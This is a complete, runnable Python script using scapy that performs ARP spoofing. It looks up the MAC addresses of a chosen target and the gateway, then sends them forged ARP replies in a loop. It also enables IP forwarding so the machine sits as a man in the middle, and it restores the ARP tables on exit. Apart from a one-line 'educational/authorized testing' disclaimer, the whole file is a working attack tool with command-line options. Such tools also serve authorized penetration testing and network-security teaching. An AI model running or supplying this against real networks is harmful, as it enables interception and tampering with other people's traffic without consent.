#!/usr/bin/env python3
"""
ARP Spoofing/Poisoning Tool
For educational purposes and authorized testing only!
"""

import time
import argparse
import sys
from scapy.all import Ether, ARP, srp, send
import netifaces as ni
import subprocess
import os

class ARPSpoofer:
    def __init__(self, target_ip, gateway_ip, interface=None):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface or self.get_default_interface()
        self.target_mac = self.get_mac(target_ip)
        self.gateway_mac = self.get_mac(gateway_ip)
        self.running = False
        
    def get_default_interface(self):
        """Get default network interface"""
        gateways = ni.gateways()
        default_gateway = gateways['default'][ni.AF_INET]
        return default_gateway[1]
    
    def get_mac(self, ip):
        """Get MAC address for IP using ARP"""
        try:
            # Create ARP request
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast / arp_request
            
            # Send packet and receive response
            result = srp(packet, timeout=3, verbose=0)[0]
            
            # Return MAC address from response
            return result[0][1].hwsrc
        except Exception as e:
            print(f"[!] Could not get MAC for {ip}: {e}")
            return None
    
    def spoof(self, target_ip, spoof_ip, target_mac):
        """Send ARP spoofing packet"""
        # Create ARP reply
        packet = ARP(op=2,          # ARP reply
                    pdst=target_ip,  # Target IP
                    hwdst=target_mac,# Target MAC
                    psrc=spoof_ip)   # Spoofed source IP
        
        # Send packet
        send(packet, verbose=0)
        print(f"[+] Sent spoofed packet: {spoof_ip} is-at {self.get_interface_mac()}")
    
    def get_interface_mac(self):
        """Get MAC address of the interface"""
        try:
            return ni.ifaddresses(self.interface)[ni.AF_LINK][0]['addr']
        except:
            return "00:11:22:33:44:55"
    
    def restore(self):
        """Restore ARP tables to original state"""
        print("\n[*] Restoring ARP tables...")
        
        # Send correct ARP replies to both target and gateway
        packet_to_target = ARP(op=2, 
                              pdst=self.target_ip,
                              hwdst=self.target_mac,
                              psrc=self.gateway_ip,
                              hwsrc=self.gateway_mac)
        
        packet_to_gateway = ARP(op=2,
                               pdst=self.gateway_ip,
                               hwdst=self.gateway_mac,
                               psrc=self.target_ip,
                               hwsrc=self.target_mac)
        
        # Send multiple packets to ensure restoration
        for i in range(4):
            send(packet_to_target, verbose=0)
            send(packet_to_gateway, verbose=0)
            time.sleep(1)
        
        print("[✓] ARP tables restored")
    
    def enable_ip_forwarding(self):
        """Enable IP forwarding for Linux"""
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1')
            print("[+] IP forwarding enabled")
        except:
            print("[!] Could not enable IP forwarding (run as root)")
    
    def disable_ip_forwarding(self):
        """Disable IP forwarding"""
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('0')
        except:
            pass
    
    def start_spoofing(self):
        """Start ARP spoofing attack"""
        if not self.target_mac or not self.gateway_mac:
            print("[!] Could not get MAC addresses. Exiting.")
            return
        
        print(f"""
╔══════════════════════════════════════════╗
║        ARP Spoofing Attack Started       ║
╠══════════════════════════════════════════╣
║ Target IP:    {self.target_ip:<16} ║
║ Target MAC:   {self.target_mac} ║
║ Gateway IP:   {self.gateway_ip:<16} ║
║ Gateway MAC:  {self.gateway_mac} ║
║ Interface:    {self.interface:<16} ║
╚══════════════════════════════════════════╝
        """)
        
        self.enable_ip_forwarding()
        self.running = True
        
        try:
            packets_sent = 0
            while self.running:
                # Tell target we are gateway
                self.spoof(self.target_ip, self.gateway_ip, self.target_mac)
                
                # Tell gateway we are target
                self.spoof(self.gateway_ip, self.target_ip, self.gateway_mac)
                
                packets_sent += 2
                print(f"[*] Packets sent: {packets_sent}", end='\r')
                time.sleep(2)
                
        except KeyboardInterrupt:
            print("\n\n[!] Stopping ARP spoofing...")
            self.stop_spoofing()
    
    def stop_spoofing(self):
        """Stop ARP spoofing and restore ARP tables"""
        self.running = False
        self.restore()
        self.disable_ip_forwarding()
        print("[✓] Attack stopped and cleaned up")

def check_root():
    """Check if script is run as root"""
    if os.geteuid() != 0:
        print("[!] This script must be run as root!")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address")
    parser.add_argument("-i", "--interface", help="Network interface (optional)")
    
    args = parser.parse_args()
    
    # Check for root privileges
    check_root()
    
    # Create and start spoofer
    spoofer = ARPSpoofer(args.target, args.gateway, args.interface)
    spoofer.start_spoofing()

if __name__ == "__main__":
    main()
